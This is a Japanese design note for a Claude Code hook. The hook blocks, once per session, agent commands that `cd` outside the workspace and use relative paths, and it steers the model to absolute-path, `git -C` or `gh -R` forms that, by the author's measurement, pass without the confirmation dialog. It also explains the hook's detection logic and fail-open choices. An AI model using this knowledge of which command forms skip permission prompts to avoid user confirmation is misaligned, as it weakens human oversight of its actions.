`cd <外部> && grep -c . CLAUDE.md` に対し `grep -c . /abs/<外部>/CLAUDE.md` は通る。
hook の理由文は簡潔さのため「毎回確認ダイアログになります」と書いているが、厳密には分類器依存。
案内先が常に通る点は上記のとおり実測済みなので、モデルへの指示としては実害がない。

deny を返す条件 (すべて満たすとき):

- セグメントに `cd <パス>` があり、移動先が作業ディレクトリのいずれの配下でもない
- その後続セグメントに、移動先に**実在する**ファイル / ディレクトリを指す相対パス引数がある

判定の要点:

- **相対パスかどうかは実在チェックで決める。** 任意のコマンドのどの引数がパスかは静的に決まらない。
  語形の推測 (ドットを含む・拡張子がある) より誤検知が少ない。1 トークン目 (コマンド名) は飛ばす —
  `cd /repo && make` で `/repo/make` が実在しても誤検知しないため
- **`.` と `..` は相対パス引数に数えない。** `[ -e "$dir/." ]` は常に真になるので、`grep -c . file`
  のような正規表現引数まで全部拾ってしまう
- **一時ディレクトリ (`/tmp` / `/private/tmp` / `/var/folders` / `$TMPDIR`) は作業ディレクトリ扱いにする。**
  Claude Code はこれらへの cd を確認に落とさない (実測)。除外しないと scratchpad での一時ファイル作業が
  丸ごと誤 deny になる (実ログ計測で無視できない割合を占めた)
- **作業ディレクトリ一覧は完全には再現できない。** hook 入力 JSON に `cwd` は入るが
  `additionalDirectories` は入らない。`~/.claude/settings.json` と cwd 側の `settings.local.json` /
  `settings.json` を読んで一覧を広く取るが、`--add-dir` フラグ由来は取りこぼす。取りこぼすと誤 deny に
  なるので、一覧が空なら判定を放棄する
- 引数なしの `cd` (= `$HOME`) と `cd -` は移動先がコマンド文字列から確定しないので対象外。heredoc
  (`<<`) を含むコマンドも対象外 (本文が実コマンドとして並んで見える)
- パス正規化に `readlink -f` を使わない。macOS の readlink は存在しないパスを解決できず黙って空を返し、
  空になると前方一致が全部外れて「外部」と誤判定する。`.` / `..` / 重複スラッシュの畳み込みは
  ファイルシステムに触らない文字列処理だけで行う (単語分割も使わない — パスに `*` があると glob 展開で
  別のパスに化ける)

**セッションにつき 1 回だけ deny する。** `cd <repo> && npm test` のように cwd 依存で絶対パスに
書き換えようがないコマンドがあるため。毎回 deny だと案内どおり直せず無限ループになる。1 回で打ち切れば、
書き換えられる形は 1 往復で直り、書き換えられない形は 2 回目にそのまま通る (静的ルールの ask に落ちるだけ)。
印ファイルは `${TMPDIR}/claude-cd-outside-workspace-gate/<session_id>` で、置けないときは素通しに倒す
(`memory-guide-gate.sh` と同じ理由)。

理由文は絶対パス・`git -C <path> <サブコマンド>`・`gh <サブコマンド> -R <owner>/<repo>` の 3 つを案内する。
**この 3 形が hook 自身の判定に当たらないことを self-test で固定してある** — 案内先が塞がれていると、
モデルが言われたとおり直しても同じ差し戻しに戻るため。

self-test: `bash .claude/hooks/cd-outside-workspace-gate.sh --self-test`
